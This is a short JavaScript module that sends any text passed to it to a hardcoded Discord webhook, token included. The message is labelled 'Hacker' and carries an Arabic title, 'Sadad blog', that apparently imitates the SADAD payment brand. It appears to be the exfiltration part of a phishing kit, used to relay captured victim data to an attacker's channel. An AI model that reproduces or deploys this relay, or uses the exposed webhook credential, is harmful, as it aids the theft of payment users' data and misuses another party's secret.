import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1337801892780314728/D54MM-BhU_JFx2Ep5xRti7lUlio3cdPNDByRSCOjvBvwjJAD_4Ctns9-9WEke6pVqUQd",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
